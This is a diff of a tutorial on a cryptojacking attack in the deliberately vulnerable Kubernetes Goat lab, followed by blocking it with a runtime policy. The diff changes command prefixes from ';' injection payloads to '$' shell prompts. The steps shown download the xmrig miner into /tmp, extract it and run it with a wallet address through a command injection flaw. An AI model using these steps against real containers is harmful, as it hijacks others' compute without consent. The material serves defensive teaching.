@@ -12,14 +12,14 @@ To showcase a cryptojacking attack, the Kubernetes Goat environment is used(<a h
 To exploit the command injection vulnerability and get started with mining, start by checking the OS that the container is running on:
 
 ```sh
-;uname -a
+$ uname -a
 ```
 For the health check deployment, the OS is ubuntu. 
 
 **Step 1**: Download the binary release of xmrig for linux-static from the <a href="https://github.com/xmrig/xmrig/releases", target="_blank">open source github page</a>. The attacker will use a version of the binary with the config file already populated with the required info.
 
 ```sh
-;wget https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-linux-static-x64.tar.gz -P /tmp
+$ wget https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-linux-static-x64.tar.gz -P /tmp
 ```
 After executing the above, the binary is downloaded into the container which can be confirmed by using ```ls```
 
@@ -28,7 +28,7 @@ After executing the above, the binary is downloaded into the container which can
 **Step 2**: Install the xmrig binary into the ```/tmp``` folder
 
 ```sh
-;tar xvzf /tmp/xmrig-6.21.2-linux-static-x64.tar.gz -C /tmp
+$ tar xvzf /tmp/xmrig-6.21.2-linux-static-x64.tar.gz -C /tmp
 ```
 On successful install, an output similar to below will be visible
 
@@ -37,7 +37,7 @@ On successful install, an output similar to below will be visible
 **Step 3**: Try running xmrig with the below command
 
 ```sh
-;/tmp/xmrig-6.21.2/xmrig 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD
+$ /tmp/xmrig-6.21.2/xmrig 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD
 ```
 Now xmrig starts to mine and here, the load becomes too high that the container gets restarted
 ```sh
@@ -146,7 +146,7 @@ To apply the policy in SaaS,
 **Step 4**: The policy is applied successfully. Now, try to execute xmrig again
 
 ```sh
-;/tmp/xmrig-6.21.2/xmrig 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD
+$ /tmp/xmrig-6.21.2/xmrig 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD
 ```
 Exit status 126 is shown as xmrig is not allowed to be executed
 
